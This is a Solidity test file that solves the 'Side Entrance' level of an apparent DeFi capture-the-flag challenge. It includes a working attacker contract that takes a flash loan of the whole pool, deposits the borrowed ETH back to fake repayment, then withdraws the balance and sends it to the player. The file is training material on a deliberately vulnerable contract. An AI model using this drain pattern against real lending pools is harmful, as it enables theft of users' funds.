// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";

contract SideEntrance is Test {
    uint256 internal constant ETHER_IN_POOL = 1_000e18;
    uint256 internal constant PLAYER_INITIAL_ETH_BALANCE = 1e18;

    Utilities internal utils;
    SideEntranceLenderPool internal sideEntranceLenderPool;
    address payable internal owner;
    address payable internal player;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(2);
        owner = users[0];
        player = users[1];
        vm.label(player, "Player");

        // Deploy pool and fund it
        vm.startPrank(owner);
        
        sideEntranceLenderPool = new SideEntranceLenderPool();
        vm.label(address(sideEntranceLenderPool), "Side Entrance Lender Pool");

        vm.deal(owner, ETHER_IN_POOL);
        sideEntranceLenderPool.deposit{value: ETHER_IN_POOL}();

        assertEq(address(sideEntranceLenderPool).balance, ETHER_IN_POOL);
        
        vm.stopPrank();
        // Player starts with limited ETH in balance
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        vm.startPrank(player);

        FlashLoanEtherReceiverAttacker attacker = new FlashLoanEtherReceiverAttacker(sideEntranceLenderPool, player);

        attacker.flashLoan();
        attacker.withdraw();

        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player took all ETH from the pool
        assertEq(address(sideEntranceLenderPool).balance, 0);
        assertGt(player.balance, ETHER_IN_POOL);
    }
}

contract FlashLoanEtherReceiverAttacker {
    SideEntranceLenderPool pool;
    address owner;
    
    constructor(SideEntranceLenderPool _pool, address _owner){
        pool = _pool;
        owner = _owner;
    }

    function execute() external payable{
        pool.deposit{value: msg.value}();
    }

    function withdraw() external {
        pool.withdraw();
    }

    function flashLoan() external {
        pool.flashLoan(address(pool).balance);
    }

    receive() external payable {
        (bool success, ) = owner.call{value : address(this).balance}("");
        require(success);
    }
}
